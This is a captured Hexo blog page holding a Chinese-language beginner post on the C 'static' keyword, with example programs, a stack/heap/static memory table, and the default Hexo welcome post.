+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> a =<span class="number">1</span>;</span><br><span class="line">    a++;</span><br><span class="line">    printf(<span class="string">&quot;%d &quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">int</span> a =<span class="number">1</span>;</span><br><span class="line">    a++;</span><br><span class="line">    printf(<span class="string">&quot;%d &quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前一个程序输出的结果是 2 2 2 2 2</p>
+<p>后一个程序输出的结果是 2 3 4 5 6</p>
+<p>因为前一个程序中a每次运行完就销毁了，后一个程序中的a在每次循环中没有被销毁。static改变的了a的生命周期</p>
+<p>本质上，static改变了变量的存储类型</p>
+<table>
+<thead>
+<tr>
+<th>栈区</th>
+<th>栈区的变量特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>局部变量、形式参数，临时变量</td>
+<td>都是临时的，进入作用域创建，出作用域销毁</td>
+</tr>
+<tr>
+<td><strong>堆区</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>malloc,calloc,realloc,free</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>静态区</strong></td>
+<td><strong>静态区的变量特点</strong></td>
+</tr>
+<tr>
+<td>全局变量，静态变量-被static修饰的变量</td>
+<td>生命周期比较长，和程序的生命周期一样</td>
+</tr>
+</tbody></table>
+<p>一个变量是存在栈区的，但是被static修饰后就存在静态区了，因为存储类型的变化，生命周期跟着变化了，变长了。</p>
+<p>OK！今天的讨论到此结束。</p>
+<h2 id="作者介绍："><a href="#作者介绍：" class="headerlink" title="作者介绍："></a>作者介绍：</h2><ul>
+<li>FAFU计算机与信息学院23级新生Lin</li>
+<li>福建南平建阳人</li>
+<li>偶像是昊杨、江峣哥哥们</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/02/Compuer-science/" data-id="clrw56q1w0001osuo558fb6kf" data-title="science" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Compuer science" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/02/Compuer%20science/" class="article-date">
+  <time class="dt-published" datetime="2023-11-02T08:56:15.630Z" itemprop="datePublished">2023-11-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Compuer-science"><a href="#Compuer-science" class="headerlink" title="Compuer science"></a>Compuer science</h1><h2 id="C语言程序设计："><a href="#C语言程序设计：" class="headerlink" title="C语言程序设计："></a>C语言程序设计：</h2><h3 id="static的性质"><a href="#static的性质" class="headerlink" title="static的性质"></a>static的性质</h3><p>各位uu们大家好，今天我分享一下作为初学者对static在C语言程序设计中的几点看法</p>
+<p>首先给大家介绍一下两个概念，作用域和生命周期：</p>
+<ul>
+<li><p>作用域  ：一段程序代码中的名字不总是有效的，而限定这个名字的可用性时这个名字的作用域</p>
+<ul>
+<li>局部变量的作用域时变量所在的局部范围</li>
+<li>全局变量的作用域是整个工程</li>
+</ul>
+</li>
+<li><p>生命周期：指变量的创建到变量的销毁之间的一个时间段</p>
+<ul>
+<li>局部变量的生命周期是：进入局部变量创建，生命周期开始，出作用域生命周期结束</li>
+<li>全局变量的生命周期是：整个程序的生命周期</li>
+</ul>
+</li>
+</ul>
+<p>下面看我演示</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> a=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>变量a打印不出结果，因为a的作用域在花括号内，出了作用域a被销毁。</p>
+<p>而static的作用是改变变量的生命周期（不改变作用域）</p>
+<ul>
+<li>先说一下static的性质（面试爱考（狗头））<ul>
+<li>修饰全局变量</li>
+<li>修饰局部变量</li>
+<li>修饰函数</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> a =<span class="number">1</span>;</span><br><span class="line">    a++;</span><br><span class="line">    printf(<span class="string">&quot;%d &quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">int</span> a =<span class="number">1</span>;</span><br><span class="line">    a++;</span><br><span class="line">    printf(<span class="string">&quot;%d &quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前一个程序输出的结果是 2 2 2 2 2</p>
+<p>后一个程序输出的结果是 2 3 4 5 6</p>
+<p>因为前一个程序中a每次运行完就销毁了，后一个程序中的a在每次循环中没有被销毁。static改变的了a的生命周期</p>
+<p>本质上，static改变了变量的存储类型</p>
+<table>
+<thead>
+<tr>
+<th>栈区</th>
+<th>栈区的变量特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>局部变量、形式参数，临时变量</td>
+<td>都是临时的，进入作用域创建，出作用域销毁</td>
+</tr>
+<tr>
+<td><strong>堆区</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>malloc,calloc,realloc,free</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>静态区</strong></td>
+<td><strong>静态区的变量特点</strong></td>
+</tr>
+<tr>
+<td>全局变量，静态变量-被static修饰的变量</td>
+<td>生命周期比较长，和程序的生命周期一样</td>
+</tr>
+</tbody></table>
+<p>一个变量是存在栈区的，但是被static修饰后就存在静态区了，因为存储类型的变化，生命周期跟着变化了，变长了。</p>
+<p>OK！今天的讨论到此结束。</p>
+<h2 id="作者介绍："><a href="#作者介绍：" class="headerlink" title="作者介绍："></a>作者介绍：</h2><ul>
+<li>FAFU计算机与信息学院23级新生Lin</li>
+<li>福建南平建阳人</li>
+<li>偶像是昊杨、江峣哥哥们</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/02/Compuer%20science/" data-id="clrw56q1n0000osuobz3q6aw5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-computer-science" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/10/29/computer-science/" class="article-date">
+  <time class="dt-published" datetime="2023-10-28T16:35:54.000Z" itemprop="datePublished">2023-10-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/10/29/computer-science/">computer science</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/10/29/computer-science/" data-id="clrw56q240005osuo32ss43hp" data-title="computer science" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/10/28/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2023-10-28T14:15:45.332Z" itemprop="datePublished">2023-10-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/10/28/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/10/28/hello-world/" data-id="clrw56q260007osuo91cs45vx" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/27/ctf/">ctf</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/26/Computer-Science-1/">Computer Science ()</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/12/Computer-science-2/">Computer science(2)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/02/Computer-Science-0/">Computer Science</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/02/Compuer-science/">science</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
